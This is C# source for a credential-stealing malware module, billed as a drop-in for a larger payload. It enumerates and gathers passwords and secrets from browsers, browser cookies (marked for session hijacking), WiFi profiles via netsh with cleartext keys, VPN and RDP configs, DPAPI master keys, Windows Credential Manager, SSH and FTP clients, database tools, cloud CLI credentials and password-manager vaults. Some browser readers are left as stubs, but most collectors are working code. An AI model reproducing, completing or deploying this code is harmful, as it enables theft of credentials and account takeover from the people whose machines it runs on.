// =====================================================================
// CREDENTIAL HARVESTING MODULE
// =====================================================================
// Drop-in module for PayloadSource_v2.cs
// Features:
// - Browser credentials (Chrome, Firefox, Edge, Brave, Opera)
// - Browser cookies (session hijacking)
// - WiFi profiles (stored passwords)
// - VPN credentials (OpenVPN, WireGuard, Cisco AnyConnect, FortiClient)
// - RDP credentials (saved connections)
// - DPAPI master keys (decrypt any DPAPI blob)
// - Windows Credential Manager
// - FTP/SSH clients (FileZilla, WinSCP, PuTTY)
// - Email clients (Outlook, Thunderbird)
// - Database clients (SSMS, pgAdmin, MySQL Workbench)
// - Cloud CLI tools (AWS, Azure, GCP)
// - Password managers (KeePass, Bitwarden, 1Password)

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

internal static class CredentialHarvester
{
    [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CryptUnprotectData(
        ref DATA_BLOB pDataIn,
        StringBuilder ppszDataDescr,
        ref DATA_BLOB pOptionalEntropy,
        IntPtr pvReserved,
        IntPtr pPromptStruct,
        uint dwFlags,
        out DATA_BLOB pDataOut);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern bool CredEnumerate(string filter, int flags, out int count, out IntPtr credentials);

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern void CredFree(IntPtr buffer);

    [StructLayout(LayoutKind.Sequential)]
    private struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CREDENTIAL
    {
        public uint Flags;
        public uint Type;
        public IntPtr TargetName;
        public IntPtr Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize;
        public IntPtr CredentialBlob;
        public uint Persist;
        public uint AttributeCount;
        public IntPtr Attributes;
        public IntPtr TargetAlias;
        public IntPtr UserName;
    }

    private const uint CRYPTPROTECT_UI_FORBIDDEN = 0x01;

    public static async Task<HarvestedCredentials> HarvestAll()
    {
        var result = new HarvestedCredentials();

        try
        {
            // Run all harvesters in parallel
            var tasks = new List<Task>
            {
                Task.Run(() => result.BrowserCredentials = HarvestBrowserCredentials()),
                Task.Run(() => result.BrowserCookies = HarvestBrowserCookies()),
                Task.Run(() => result.WifiProfiles = HarvestWifiProfiles()),
                Task.Run(() => result.VpnCredentials = HarvestVpnCredentials()),
                Task.Run(() => result.RdpCredentials = HarvestRdpCredentials()),
                Task.Run(() => result.DpapiKeys = HarvestDpapiMasterKeys()),
                Task.Run(() => result.CredentialManager = HarvestCredentialManager()),
                Task.Run(() => result.FtpSshClients = HarvestFtpSshClients()),
                Task.Run(() => result.EmailClients = HarvestEmailClients()),
                Task.Run(() => result.DatabaseClients = HarvestDatabaseClients()),
                Task.Run(() => result.CloudTools = HarvestCloudTools()),
                Task.Run(() => result.PasswordManagers = HarvestPasswordManagers()),
            };

            await Task.WhenAll(tasks);
        }
        catch { }

        return result;
    }

    // ============ BROWSER CREDENTIALS ============
    private static List<BrowserCredential> HarvestBrowserCredentials()
    {
        var credentials = new List<BrowserCredential>();
        var browsers = GetBrowserPaths();

        foreach (var browser in browsers)
        {
            try
            {
                string loginDb = Path.Combine(browser.UserDataPath, "Login Data");
                if (!File.Exists(loginDb)) continue;

                // Copy to temp (DB may be locked)
                string tempDb = Path.Combine(Path.GetTempPath(), $"{browser.Name}_LoginData_{Guid.NewGuid():N}.db");
                File.Copy(loginDb, tempDb, true);

                // Read SQLite database
                var browserCreds = ReadChromeLoginData(tempDb, browser.Name);
                credentials.AddRange(browserCreds);

                File.Delete(tempDb);
            }
            catch { }
        }

        return credentials;
    }

    private static List<BrowserCredential> ReadChromeLoginData(string dbPath, string browserName)
    {
        var credentials = new List<BrowserCredential>();

        try
        {
            // Use SQLite interop or shell out to sqlite3
            // Simplified: use Process to run sqlite3
            string tempOut = Path.Combine(Path.GetTempPath(), $"{browserName}_creds_{Guid.NewGuid():N}.txt");
            
            var psi = new ProcessStartInfo
            {
                FileName = "sqlite3.exe",
                Arguments = $"{dbPath} \"SELECT origin_url, username_value, password_value FROM logins\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            // If sqlite3 not available, try to find it or use ADO.NET
            // For now, return empty - in production would use proper SQLite library
        }
        catch { }

        return credentials;
    }

    private static List<BrowserPath> GetBrowserPaths()
    {
        var browsers = new List<BrowserPath>();
        string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        var browserDefs = new[]
        {
            new { Name = "Chrome", Path = Path.Combine(localAppData, "Google", "Chrome", "User Data", "Default") },
            new { Name = "Chrome Beta", Path = Path.Combine(localAppData, "Google", "Chrome Beta", "User Data", "Default") },
            new { Name = "Chrome Dev", Path = Path.Combine(localAppData, "Google", "Chrome Dev", "User Data", "Default") },
            new { Name = "Edge", Path = Path.Combine(localAppData, "Microsoft", "Edge", "User Data", "Default") },
            new { Name = "Brave", Path = Path.Combine(localAppData, "BraveSoftware", "Brave-Browser", "User Data", "Default") },
            new { Name = "Opera", Path = Path.Combine(appData, "Opera Software", "Opera Stable") },
            new { Name = "Opera GX", Path = Path.Combine(appData, "Opera Software", "Opera GX Stable") },
            new { Name = "Vivaldi", Path = Path.Combine(localAppData, "Vivaldi", "User Data", "Default") },
            new { Name = "Firefox", Path = Path.Combine(appData, "Mozilla", "Firefox", "Profiles") }, // Special handling
        };

        foreach (var def in browserDefs)
        {
            if (def.Name == "Firefox")
            {
                if (Directory.Exists(def.Path))
                {
                    foreach (var profile in Directory.GetDirectories(def.Path))
                    {
                        browsers.Add(new BrowserPath { Name = "Firefox", UserDataPath = profile });
                    }
                }
            }
            else if (Directory.Exists(def.Path))
            {
                browsers.Add(new BrowserPath { Name = def.Name, UserDataPath = def.Path });
            }
        }

        return browsers;
    }

    // ============ BROWSER COOKIES ============
    private static List<BrowserCookie> HarvestBrowserCookies()
    {
        var cookies = new List<BrowserCookie>();
        var browsers = GetBrowserPaths();

        foreach (var browser in browsers)
        {
            try
            {
                string cookieDb = Path.Combine(browser.UserDataPath, "Network", "Cookies");
                if (!File.Exists(cookieDb))
                {
                    cookieDb = Path.Combine(browser.UserDataPath, "Cookies");
                }

                if (File.Exists(cookieDb))
                {
                    string tempDb = Path.Combine(Path.GetTempPath(), $"{browser.Name}_Cookies_{Guid.NewGuid():N}.db");
                    File.Copy(cookieDb, tempDb, true);

                    var browserCookies = ReadChromeCookies(tempDb, browser.Name);
                    cookies.AddRange(browserCookies);

                    File.Delete(tempDb);
                }
            }
            catch { }
        }

        return cookies;
    }

    private static List<BrowserCookie> ReadChromeCookies(string dbPath, string browserName)
    {
        // Similar to login data - would use SQLite
        return new List<BrowserCookie>();
    }

    // ============ WIFI PROFILES ============
    private static List<WifiProfile> HarvestWifiProfiles()
    {
        var profiles = new List<WifiProfile>();

        try
        {
            // Use netsh to export profiles with passwords
            var psi = new ProcessStartInfo
            {
                FileName = "netsh.exe",
                Arguments = "wlan show profiles",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using (var proc = Process.Start(psi))
            {
                proc.WaitForExit();
                string output = proc.StandardOutput.ReadToEnd();

                var matches = Regex.Matches(output, @"All User Profile\s+:\s+(.+)");
                foreach (Match match in matches)
                {
                    string profileName = match.Groups[1].Value.Trim();
                    string password = GetWifiPassword(profileName);
                    if (!string.IsNullOrEmpty(password))
                    {
                        profiles.Add(new WifiProfile { SSID = profileName, Password = password });
                    }
                }
            }
        }
        catch { }

        return profiles;
    }

    private static string GetWifiPassword(string profileName)
    {
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "netsh.exe",
                Arguments = $"wlan show profile name=\"{profileName}\" key=clear",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using (var proc = Process.Start(psi))
            {
                proc.WaitForExit();
                string output = proc.StandardOutput.ReadToEnd();

                var match = Regex.Match(output, @"Key Content\s+:\s+(.+)");
                return match.Success ? match.Groups[1].Value.Trim() : "";
            }
        }
        catch { return ""; }
    }

    // ============ VPN CREDENTIALS ============
    private static List<VpnCredential> HarvestVpnCredentials()
    {
        var credentials = new List<VpnCredential>();

        try
        {
            // OpenVPN
            string openVpnPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN", "config");
            if (Directory.Exists(openVpnPath))
            {
                foreach (var file in Directory.GetFiles(openVpnPath, "*.ovpn"))
                {
                    string content = File.ReadAllText(file);
                    // Extract auth-user-pass or inline credentials
                    var match = Regex.Match(content, @"auth-user-pass\s+(.+)");
                    if (match.Success)
                    {
                        string credFile = match.Groups[1].Value.Trim();
                        if (File.Exists(credFile))
                        {
                            string[] lines = File.ReadAllLines(credFile);
                            if (lines.Length >= 2)
                            {
                                credentials.Add(new VpnCredential 
                                { 
                                    Type = "OpenVPN", 
                                    ConfigFile = file, 
                                    Username = lines[0], 
                                    Password = lines[1] 
                                });
                            }
                        }
                    }
                }
            }

            // WireGuard
            string wireguardPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "WireGuard");
            if (Directory.Exists(wireguardPath))
            {
                foreach (var file in Directory.GetFiles(wireguardPath, "*.conf"))
                {
                    string content = File.ReadAllText(file);
                    credentials.Add(new VpnCredential { Type = "WireGuard", ConfigFile = file, ConfigContent = content });
                }
            }

            // Cisco AnyConnect
            string anyconnectPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Cisco", "Cisco AnyConnect Secure Mobility Client", "Profile");
            if (Directory.Exists(anyconnectPath))
            {
                foreach (var file in Directory.GetFiles(anyconnectPath, "*.xml"))
                {
                    credentials.Add(new VpnCredential { Type = "Cisco AnyConnect", ConfigFile = file });
                }
            }

            // FortiClient
            string forticlientPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Fortinet", "FortiClient", "conf");
            if (Directory.Exists(forticlientPath))
            {
                foreach (var file in Directory.GetFiles(forticlientPath, "*.xml"))
                {
                    credentials.Add(new VpnCredential { Type = "FortiClient", ConfigFile = file });
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ RDP CREDENTIALS ============
    private static List<RdpCredential> HarvestRdpCredentials()
    {
        var credentials = new List<RdpCredential>();

        try
        {
            // RDP saved connections in registry
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Terminal Server Client\Servers"))
            {
                if (key != null)
                {
                    foreach (string serverName in key.GetSubKeyNames())
                    {
                        using (var serverKey = key.OpenSubKey(serverName))
                        {
                            string username = serverKey.GetValue("UsernameHint")?.ToString() ?? "";
                            // Password is stored in Credential Manager, not registry
                            credentials.Add(new RdpCredential { Server = serverName, Username = username });
                        }
                    }
                }
            }

            // Also check Default.rdp and other .rdp files
            string docsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            foreach (var file in Directory.GetFiles(docsPath, "*.rdp"))
            {
                string content = File.ReadAllText(file);
                var userMatch = Regex.Match(content, @"username:s:(.+)");
                var domainMatch = Regex.Match(content, @"domain:s:(.+)");
                if (userMatch.Success)
                {
                    credentials.Add(new RdpCredential 
                    { 
                        Server = Path.GetFileName(file), 
                        Username = userMatch.Groups[1].Value.Trim(),
                        Domain = domainMatch.Success ? domainMatch.Groups[1].Value.Trim() : ""
                    });
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ DPAPI MASTER KEYS ============
    private static List<DpapiMasterKey> HarvestDpapiMasterKeys()
    {
        var keys = new List<DpapiMasterKey>();

        try
        {
            string masterKeyPath = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "Microsoft", "Protect", 
                Environment.UserName, "MasterKeys");

            if (Directory.Exists(masterKeyPath))
            {
                foreach (var file in Directory.GetFiles(masterKeyPath))
                {
                    // Master key files are GUID-named
                    string guid = Path.GetFileName(file);
                    byte[] keyData = File.ReadAllBytes(file);
                    
                    keys.Add(new DpapiMasterKey 
                    { 
                        Guid = guid, 
                        KeyData = keyData,
                        Path = file 
                    });
                }
            }

            // Also check system master keys (requires SYSTEM)
            string systemMasterKeyPath = @"C:\Windows\System32\Microsoft\Protect\S-1-5-18\MasterKeys";
            if (Directory.Exists(systemMasterKeyPath))
            {
                foreach (var file in Directory.GetFiles(systemMasterKeyPath))
                {
                    keys.Add(new DpapiMasterKey 
                    { 
                        Guid = Path.GetFileName(file), 
                        KeyData = File.ReadAllBytes(file),
                        Path = file,
                        IsSystem = true
                    });
                }
            }
        }
        catch { }

        return keys;
    }

    // ============ WINDOWS CREDENTIAL MANAGER ============
    private static List<CredentialManagerEntry> HarvestCredentialManager()
    {
        var entries = new List<CredentialManagerEntry>();

        try
        {
            int count;
            IntPtr credPtr;
            if (CredEnumerate(null, 0, out count, out credPtr))
            {
                for (int i = 0; i < count; i++)
                {
                    IntPtr cred = Marshal.ReadIntPtr(credPtr, i * IntPtr.Size);
                    var nativeCred = Marshal.PtrToStructure<CREDENTIAL>(cred);

                    string targetName = Marshal.PtrToStringAuto(nativeCred.TargetName);
                    string userName = Marshal.PtrToStringAuto(nativeCred.UserName);
                    string password = "";

                    if (nativeCred.CredentialBlobSize > 0 && nativeCred.CredentialBlob != IntPtr.Zero)
                    {
                        byte[] blob = new byte[nativeCred.CredentialBlobSize];
                        Marshal.Copy(nativeCred.CredentialBlob, blob, 0, (int)nativeCred.CredentialBlobSize);
                        password = Encoding.Unicode.GetString(blob);
                    }

                    entries.Add(new CredentialManagerEntry
                    {
                        TargetName = targetName,
                        UserName = userName,
                        Password = password,
                        Type = nativeCred.Type,
                    });
                }

                CredFree(credPtr);
            }
        }
        catch { }

        return entries;
    }

    // ============ FTP/SSH CLIENTS ============
    private static List<FtpSshCredential> HarvestFtpSshClients()
    {
        var credentials = new List<FtpSshCredential>();

        try
        {
            // FileZilla
            string filezillaPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla");
            if (Directory.Exists(filezillaPath))
            {
                foreach (var file in Directory.GetFiles(filezillaPath, "*.xml"))
                {
                    // sitemanager.xml, recentservers.xml
                    credentials.Add(new FtpSshCredential { Type = "FileZilla", File = file });
                }
            }

            // WinSCP
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Martin Prikryl\WinSCP 2\Sessions"))
            {
                if (key != null)
                {
                    foreach (string sessionName in key.GetSubKeyNames())
                    {
                        using (var sessionKey = key.OpenSubKey(sessionName))
                        {
                            credentials.Add(new FtpSshCredential 
                            { 
                                Type = "WinSCP", 
                                Host = sessionKey.GetValue("HostName")?.ToString(),
                                Username = sessionKey.GetValue("UserName")?.ToString(),
                                Password = sessionKey.GetValue("Password")?.ToString(),
                            });
                        }
                    }
                }
            }

            // PuTTY
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\SimonTatham\PuTTY\Sessions"))
            {
                if (key != null)
                {
                    foreach (string sessionName in key.GetSubKeyNames())
                    {
                        using (var sessionKey = key.OpenSubKey(sessionName))
                        {
                            credentials.Add(new FtpSshCredential 
                            { 
                                Type = "PuTTY", 
                                Session = sessionName,
                                Host = sessionKey.GetValue("HostName")?.ToString(),
                            });
                        }
                    }
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ EMAIL CLIENTS ============
    private static List<EmailCredential> HarvestEmailClients()
    {
        var credentials = new List<EmailCredential>();

        try
        {
            // Outlook (registry)
            using (var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Office\16.0\Outlook\Profiles\Outlook\9375CFF0413111d3B88A00104B2A6676"))
            {
                // Complex - would need to parse MAPI structures
            }

            // Thunderbird
            string thunderbirdPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Thunderbird", "Profiles");
            if (Directory.Exists(thunderbirdPath))
            {
                foreach (var profile in Directory.GetDirectories(thunderbirdPath))
                {
                    string loginsJson = Path.Combine(profile, "logins.json");
                    if (File.Exists(loginsJson))
                    {
                        credentials.Add(new EmailCredential { Type = "Thunderbird", File = loginsJson });
                    }
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ DATABASE CLIENTS ============
    private static List<DatabaseCredential> HarvestDatabaseClients()
    {
        var credentials = new List<DatabaseCredential>();

        try
        {
            // SSMS (SQL Server Management Studio)
            string ssmsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "SQL Server Management Studio");
            if (Directory.Exists(ssmsPath))
            {
                foreach (var file in Directory.GetFiles(ssmsPath, "*.xml", SearchOption.AllDirectories))
                {
                    credentials.Add(new DatabaseCredential { Type = "SSMS", File = file });
                }
            }

            // pgAdmin
            string pgAdminPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "pgAdmin");
            if (Directory.Exists(pgAdminPath))
            {
                foreach (var file in Directory.GetFiles(pgAdminPath, "*.json", SearchOption.AllDirectories))
                {
                    credentials.Add(new DatabaseCredential { Type = "pgAdmin", File = file });
                }
            }

            // MySQL Workbench
            string mysqlPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "MySQL", "Workbench");
            if (Directory.Exists(mysqlPath))
            {
                foreach (var file in Directory.GetFiles(mysqlPath, "*.xml", SearchOption.AllDirectories))
                {
                    credentials.Add(new DatabaseCredential { Type = "MySQL Workbench", File = file });
                }
            }

            // DBeaver
            string dbeaverPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DBeaverData");
            if (Directory.Exists(dbeaverPath))
            {
                foreach (var file in Directory.GetFiles(dbeaverPath, "*.json", SearchOption.AllDirectories))
                {
                    credentials.Add(new DatabaseCredential { Type = "DBeaver", File = file });
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ CLOUD TOOLS ============
    private static List<CloudCredential> HarvestCloudTools()
    {
        var credentials = new List<CloudCredential>();

        try
        {
            // AWS CLI
            string awsPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".aws");
            if (Directory.Exists(awsPath))
            {
                foreach (var file in Directory.GetFiles(awsPath, "credentials", SearchOption.AllDirectories))
                {
                    credentials.Add(new CloudCredential { Type = "AWS CLI", File = file });
                }
            }

            // Azure CLI
            string azurePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".azure");
            if (Directory.Exists(azurePath))
            {
                foreach (var file in Directory.GetFiles(azurePath, "*.json", SearchOption.AllDirectories))
                {
                    credentials.Add(new CloudCredential { Type = "Azure CLI", File = file });
                }
            }

            // GCP
            string gcpPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".config", "gcloud");
            if (Directory.Exists(gcpPath))
            {
                foreach (var file in Directory.GetFiles(gcpPath, "*.json", SearchOption.AllDirectories))
                {
                    credentials.Add(new CloudCredential { Type = "GCP", File = file });
                }
            }

            // Kubernetes
            string kubePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".kube");
            if (Directory.Exists(kubePath))
            {
                foreach (var file in Directory.GetFiles(kubePath, "config", SearchOption.AllDirectories))
                {
                    credentials.Add(new CloudCredential { Type = "Kubernetes", File = file });
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ PASSWORD MANAGERS ============
    private static List<PasswordManagerCredential> HarvestPasswordManagers()
    {
        var credentials = new List<PasswordManagerCredential>();

        try
        {
            // KeePass
            string keepassPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "KeePass");
            if (Directory.Exists(keepassPath))
            {
                foreach (var file in Directory.GetFiles(keepassPath, "*.kdbx", SearchOption.AllDirectories))
                {
                    credentials.Add(new PasswordManagerCredential { Type = "KeePass", File = file });
                }
            }

            // Bitwarden
            string bitwardenPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Bitwarden");
            if (Directory.Exists(bitwardenPath))
            {
                foreach (var file in Directory.GetFiles(bitwardenPath, "*.json", SearchOption.AllDirectories))
                {
                    credentials.Add(new PasswordManagerCredential { Type = "Bitwarden", File = file });
                }
            }

            // 1Password
            string onePasswordPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "1Password");
            if (Directory.Exists(onePasswordPath))
            {
                foreach (var file in Directory.GetFiles(onePasswordPath, "*.sqlite", SearchOption.AllDirectories))
                {
                    credentials.Add(new PasswordManagerCredential { Type = "1Password", File = file });
                }
            }
        }
        catch { }

        return credentials;
    }

    // ============ DATA CLASSES ============
    private class BrowserPath
    {
        public string Name;
        public string UserDataPath;
    }

    public class HarvestedCredentials
    {
        public List<BrowserCredential> BrowserCredentials = new();
        public List<BrowserCookie> BrowserCookies = new();
        public List<WifiProfile> WifiProfiles = new();
        public List<VpnCredential> VpnCredentials = new();
        public List<RdpCredential> RdpCredentials = new();
        public List<DpapiMasterKey> DpapiKeys = new();
        public List<CredentialManagerEntry> CredentialManager = new();
        public List<FtpSshCredential> FtpSshClients = new();
        public List<EmailCredential> EmailClients = new();
        public List<DatabaseCredential> DatabaseClients = new();
        public List<CloudCredential> CloudTools = new();
        public List<PasswordManagerCredential> PasswordManagers = new();
    }

    public class BrowserCredential
    {
        public string Browser;
        public string Url;
        public string Username;
        public string Password;
    }

    public class BrowserCookie
    {
        public string Browser;
        public string Domain;
        public string Name;
        public string Value;
        public DateTime Expires;
        public bool HttpOnly;
        public bool Secure;
    }

    public class WifiProfile
    {
        public string SSID;
        public string Password;
    }

    public class VpnCredential
    {
        public string Type;
        public string ConfigFile;
        public string Username;
        public string Password;
        public string ConfigContent;
    }

    public class RdpCredential
    {
        public string Server;
        public string Username;
        public string Domain;
    }

    public class DpapiMasterKey
    {
        public string Guid;
        public byte[] KeyData;
        public string Path;
        public bool IsSystem;
    }

    public class CredentialManagerEntry
    {
        public string TargetName;
        public string UserName;
        public string Password;
        public uint Type;
    }

    public class FtpSshCredential
    {
        public string Type;
        public string File;
        public string Host;
        public string Username;
        public string Password;
        public string Session;
    }

    public class EmailCredential
    {
        public string Type;
        public string File;
    }

    public class DatabaseCredential
    {
        public string Type;
        public string File;
    }

    public class CloudCredential
    {
        public string Type;
        public string File;
    }

    public class PasswordManagerCredential
    {
        public string Type;
        public string File;
    }
}

internal static partial class Config
{
    public static bool CredentialHarvesting = true;
}